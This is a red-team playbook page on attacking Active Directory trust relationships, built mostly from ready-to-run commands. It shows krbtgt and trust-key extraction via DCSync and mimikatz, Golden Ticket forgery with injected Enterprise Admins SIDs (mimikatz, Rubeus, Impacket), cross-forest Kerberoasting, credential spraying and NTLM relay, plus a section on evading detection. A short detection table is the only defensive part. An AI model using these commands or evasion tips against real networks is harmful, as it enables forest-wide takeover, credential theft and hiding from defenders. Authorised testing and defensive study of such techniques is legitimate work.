# Forest & Trust Attacks

> **MITRE ATT&CK**: Lateral Movement > T1550.003 - Use Alternate Authentication Material: Pass the Ticket
> **Platforms**: Windows
> **Required Privileges**: Domain Admin (in child domain)
> **OPSEC Risk**: High

---

## Strategic Overview

Active Directory trust relationships exist to allow authentication and resource access across domain and forest boundaries. From a red team perspective, trusts are lateral movement highways. Compromising a child domain almost always leads to the parent domain and the entire forest. Cross-forest trusts are harder to abuse due to SID Filtering, but misconfigurations and shared credentials frequently provide a path. A Red Team Lead must understand trust architecture deeply because defenders often underestimate these attack paths.

---

## Technical Deep-Dive

### Trust Types and Their Security Implications

| Trust Type | Direction | Transitivity | SID Filtering | Attack Surface |
|---|---|---|---|---|
| Parent-Child | Two-way | Transitive | Disabled by default | ExtraSids / Trust key abuse |
| Tree-Root | Two-way | Transitive | Disabled by default | Same as Parent-Child |
| External | One-way or Two-way | Non-transitive | Enabled | NTLM relay, shared creds |
| Forest | One-way or Two-way | Transitive | Enabled (quarantined) | Kerberoast across trust, foreign ACLs |
| Shortcut | One-way or Two-way | Transitive | Inherits from parent | Reduces hop count, same attack surface |
| Realm (MIT) | One-way or Two-way | Configurable | Varies | Cross-platform Kerberos abuse |

### Trust Enumeration

```powershell
# Native Windows
nltest /domain_trusts /all_trusts
nltest /trusted_domains

# Active Directory PowerShell module
Get-ADTrust -Filter * | Select-Object Name, Direction, TrustType, DisallowTransivity, SIDFilteringQuarantined
Get-ADTrust -Filter {TrustType -eq "Forest"} | Select-Object Name, Direction

# PowerView enumeration
Get-DomainTrust
Get-DomainTrust -Domain foreign.local
Get-ForestDomain
Get-ForestTrust
Get-DomainTrustMapping    # Recursive trust enumeration

# BloodHound collection across trusts
SharpHound.exe -c All --domain child.domain.local
SharpHound.exe -c All --domain parent.domain.local
# Then analyze trust edges in BloodHound GUI
```

### Child-to-Parent: ExtraSids Attack

This is the canonical trust abuse. A Domain Admin in a child domain forges a Golden Ticket that includes the Enterprise Admins SID (RID 519) of the parent domain in the SID History field. SID Filtering is disabled on intra-forest trusts by default, so this works.

```powershell
# Step 1: Get child domain SID
Get-DomainSID -Domain child.domain.local
# Result: S-1-5-21-1234567890-1234567890-1234567890

# Step 2: Get parent domain SID (for Enterprise Admins SID construction)
Get-DomainSID -Domain domain.local
# Result: S-1-5-21-9876543210-9876543210-9876543210
# Enterprise Admins SID = S-1-5-21-9876543210-9876543210-9876543210-519

# Step 3: Extract child domain KRBTGT hash
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:child.domain.local /user:krbtgt"'
# Or: secretsdump.py child/admin@dc01.child.domain.local -just-dc-user krbtgt

# Step 4: Forge Golden Ticket with ExtraSids
mimikatz.exe "kerberos::golden /user:Administrator /domain:child.domain.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:<CHILD_KRBTGT_NTLM> /sids:S-1-5-21-9876543210-9876543210-9876543210-519 /ptt"

# Rubeus equivalent
Rubeus.exe golden /user:Administrator /domain:child.domain.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /rc4:<CHILD_KRBTGT_NTLM> /sids:S-1-5-21-9876543210-9876543210-9876543210-519 /ptt

# Step 5: Verify access to parent domain DC
dir \\dc01.domain.local\C$
```

### Child-to-Parent: Inter-Realm Trust Key

An alternative to ExtraSids uses the inter-realm trust key directly to forge an inter-realm TGT.

```powershell
# Extract trust key
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
# Or from DCSync: lsadump::dcsync /domain:child.domain.local /user:child.domain.local$

# Forge inter-realm TGT using trust key
mimikatz.exe "kerberos::golden /user:Administrator /domain:child.domain.local /sid:S-1-5-21-CHILD_SID /rc4:<TRUST_KEY_NTLM> /service:krbtgt /target:domain.local /sids:S-1-5-21-PARENT_SID-519 /ptt"

# Impacket approach
ticketer.py -nthash <TRUST_KEY> -domain child.domain.local -domain-sid S-1-5-21-CHILD_SID -extra-sid S-1-5-21-PARENT_SID-519 -spn krbtgt/domain.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass domain.local/Administrator@dc01.domain.local
```

### Cross-Forest Attacks

SID Filtering is enabled on forest trusts. This blocks injection of SIDs with RID < 1000, which means you cannot inject Enterprise Admins (519), Domain Admins (512), or other built-in group SIDs. However, several attack paths remain viable.

```powershell
# Enumerate foreign domain users and groups
Get-DomainUser -Domain foreign.local
Get-DomainGroup -Domain foreign.local

# Kerberoasting across forest trusts
Get-DomainUser -Domain foreign.local -SPN | Select-Object samaccountname, serviceprincipalname
Rubeus.exe kerberoast /domain:foreign.local /dc:dc01.foreign.local

# Find foreign group memberships (users from our domain in their groups)
Get-DomainForeignGroupMember -Domain foreign.local
Get-DomainForeignUser -Domain foreign.local

# Find ACLs granted to foreign principals
Get-DomainObjectAcl -Domain foreign.local -ResolveGUIDs | ? {$_.SecurityIdentifier -match "S-1-5-21-OUR_DOMAIN_SID"}

# SID History injection across forest (RID >= 1000 only)
# Can target custom groups that have been granted admin access
mimikatz.exe "kerberos::golden /user:attacker /domain:our.local /sid:S-1-5-21-OUR_SID /krbtgt:<HASH> /sids:S-1-5-21-FOREIGN_SID-1337 /ptt"
```

### External Trust Exploitation

```powershell
# External trusts use NTLM by default for authentication
# Shared/reused credentials between environments are the primary attack vector

# Enumerate accounts in external domain
Get-DomainUser -Domain partner.local -Properties samaccountname,description

# Test credential reuse
crackmapexec smb dc01.partner.local -u harvested_users.txt -p harvested_passwords.txt

# NTLM relay across external trusts (if signing not enforced)
ntlmrelayx.py -t smb://dc01.partner.local -smb2support
```

---

## Detection & Evasion

### Detection Opportunities

| Indicator | Event ID / Source | What to Look For |
|---|---|---|
| Inter-realm TGT request | 4768 (Kerberos TGS) | Ticket requests for krbtgt/PARENT.DOMAIN from child DC |
| SID History modification | 4765, 4766 | SID History added to account |
| Golden Ticket anomalies | 4624, 4672 | Logon with privileges from non-existent account |
| Cross-domain auth spike | 4769 | Unusual volume of cross-domain service tickets |
| Trust modification | 4706, 4707, 4716 | Trust creation, removal, or modification |

### Evasion Techniques

```
- Use AES256 keys instead of RC4 for ticket forging (avoids downgrade alerts)
- Set realistic ticket lifetimes (10 hours, not 10 years)
- Use legitimate usernames that exist in the domain
- Time operations during business hours when cross-domain auth is normal
- Forge tickets for service accounts that normally authenticate across trusts
- Avoid accessing multiple high-value targets in rapid succession
```

### OPSEC Considerations

- ExtraSids attack generates Event 4624 on the parent DC with the child domain user context
- Microsoft Defender for Identity detects suspicious inter-realm TGT activity
- ATA/MDI can correlate child-to-parent escalation patterns
- Legitimate cross-forest Kerberoasting may be rare; high volume stands out

---

## Cross-References

- [AD Fundamentals](ad-fundamentals.md) - Trust architecture basics
- [AD Persistence Deep Dive](ad-persistence-deep-dive.md) - Maintaining access post-trust abuse
- [Domain Trust Mapping](../08-discovery/domain-trust-mapping.md) - Discovery techniques
- [Golden Ticket](../07-credential-access/golden-ticket.md) - Ticket forging mechanics
- [Kerberoasting](../07-credential-access/kerberoasting.md) - Cross-trust Kerberoasting

---

## References

- Microsoft: How Domain and Forest Trusts Work
- Harmj0y: "A Guide to Attacking Domain Trusts"
- Sean Metcalf (adsecurity.org): Trust exploitation and SID Filtering deep dive
- Will Schroeder: "Not A Security Boundary" - Forest trust analysis
- MITRE ATT&CK T1550.003 - Pass the Ticket
- Dirk-jan Mollema: Cross-forest attacks and SID Filtering bypass research
